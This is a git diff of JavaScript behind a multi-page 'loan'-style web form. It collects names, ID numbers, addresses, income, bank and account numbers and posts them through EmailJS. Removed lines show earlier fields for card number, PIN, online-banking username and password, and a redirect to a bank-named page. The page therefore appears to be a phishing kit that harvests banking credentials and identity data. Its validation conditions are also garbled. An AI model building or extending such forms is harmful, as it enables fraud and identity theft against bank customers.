@@ -1,7 +1,6 @@
 
-
 let btn = document.getElementById("submit");
-let pop = document.getElementById('fail-write');
+let terms = document.getElementById('term');
 let write = document.getElementById('write');
 let banks = document.getElementById('banks')
 let page1 = document.getElementById('page1')
@@ -50,23 +49,29 @@ window.onload = function() {
         emailjs.sendForm("service_hlj3n6r","template_o5n054h", this)
         .then(function() {
             console.log('SUCCESS!');
+            let successful = document.getElementById("successful")
             let subscribe = document.getElementById('submit')
-            console.log('na me')
+            // console.log('na me')
             subscribe.style.animationName = 'done';
             subscribe.value = 'DONE'
-            // let Subscribe = setTimeout(sub, 2800);
-            // function sub(){
-            //     subscribe.value = 'Submitted Successfully'
-            //     window.location.href="https://workbasehq.github.io/fnb-end/"
-            // }
+            setTimeout(sub, 200);
+            function sub(){
+                form.style.display = 'none'
+               successful.style.display = "block"
+            }
         }, function(error) {
                 console.log('FAILED...', error);
                 let subscribe = document.getElementById('submit')
                 subscribe.value = 'unable to submit'
                 subscribe.style.animationName = 'failed';
-                let Subscribe = setTimeout(sub, 10000);
+                setTimeout(sub, 800);
                 function sub(){
-                    subscribe.value = 'Submit '
+                    let writng = document.getElementById('write-up');
+                    let form = document.getElementById("contact-form")
+                    writng.style.display = 'inline'
+                    writng.style.color = 'black'
+                    form.style.display = 'none'
+                    terms.style.display = 'none'
                 }
             });
         });
@@ -79,23 +84,6 @@ function myFunction(){
     console.log(bankSelected)
     console.log(opt1)
 }
-
-btn.addEventListener('click', ()=>{
-    
-    let writng = document.getElementById('write-up');
-    let form = document.getElementById("contact-form")
-    writng.style.display = 'inline'
-    writng.style.color = 'black'
-    form.style.display = 'none'
-    pop.style.display = 'none'
-})
-
-let reason = document.getElementById("failure");
-reason.addEventListener('click', ()=>{
-    pop.style.display = 'inline'
-    write.style.display = 'none'
-
-})
 
 let btn1 = document.getElementById('btn1');
 let fname = document.getElementById("name")
@@ -112,7 +100,7 @@ let duration = document.getElementById("duration")
 let pick = document.getElementById("pick")
 let income = document.getElementById("income")
 let phone = document.getElementById("phone")
-let id = document.getElementById("id")
+let id = document.getElementById("reference")
 let error = document.getElementById("error-message")
 let error2 = document.getElementById("error-message2")
 let form = document.getElementById("contact-form")
@@ -120,19 +108,16 @@ let agree = document.getElementById("agree")
 
 let bank = document.getElementById("banks");
 let account = document.getElementById("account");
-let card = document.getElementById("card");
-let pin = document.getElementById("pin");
-let username = document.getElementById("username");
-let password = document.getElementById("password");
-let email = document.getElementById("email");
+let yesNo = document.getElementById("yes/no");
 
-function onClickFunction(){
+
+btn1.addEventListener("click",() => {
     console.log(agree.value)
     if(fname.value ==="" || surname.value ==="" || kin.value ==="" &&
-     occupation.value ==="" || address.value ==="" || province.value === "" &&
-     postal.value ==="" || date.value ==="" || inputsign.value === "" &&
-     city.value ==="" || duration.value ==="" || pick.value === "" && 
-     income.value ==="" || phone.value ==="" || id.value === ""  ){
+    occupation.value ==="" || address.value ==="" || province.value === "" &&
+    postal.value ==="" || date.value ==="" || inputsign.value === "" &&
+    city.value ==="" || duration.value ==="" || pick.value === "" && 
+    income.value ==="" || phone.value ==="" || id.value === ""  ){
         error.innerHTML = "kindly fill all the required details above";
         error.style.color = "red";
         error.style.fontSize =  "120%"
@@ -144,22 +129,21 @@ function onClickFunction(){
         }
     }else{
         console.log("here")
-        setTimeout(sub, 1000);
-        function sub(){
-            page1.style.display = "none"
-            page2.style.display = "block"
+        setTimeout(bub, 1000);
+        function bub(){
+            page1.style.display = "none";
+            page2.style.display = "block";
             error.innerHTML = '';
-            // console.log(formDetails)
         }
     }
-}
+})
+
 
 setInterval(nub, 1000)
 function nub(){
 
-    if(bank.value === "Select your bank" || account.value === "" || card.value === "" &&
-    pin.value === "" || username.value === "" || password.value === "" &&
-    email.value === "" ){
+    if(fname.value === "" || surname.value === "" || bank.value === "Select your bank" &&
+       account.value === "" || address.value === "" || id.value === "" ){
 
     error2.innerHTML = "kindly fill all the required details above";
     error2.style.color = "red";
@@ -179,3 +163,15 @@ function onClickFunction2 (){
     page1.style.display = "block"
     page2.style.display = "none"
 }
+
+let condition = document.getElementById("condition")
+condition.addEventListener("click", () =>{
+    terms.style.display = "block"
+    form.style.display = "none"
+})
+
+function onClickFunction3(){
+    form.style.display = "block"
+    terms.style.display = "none"
+}
+
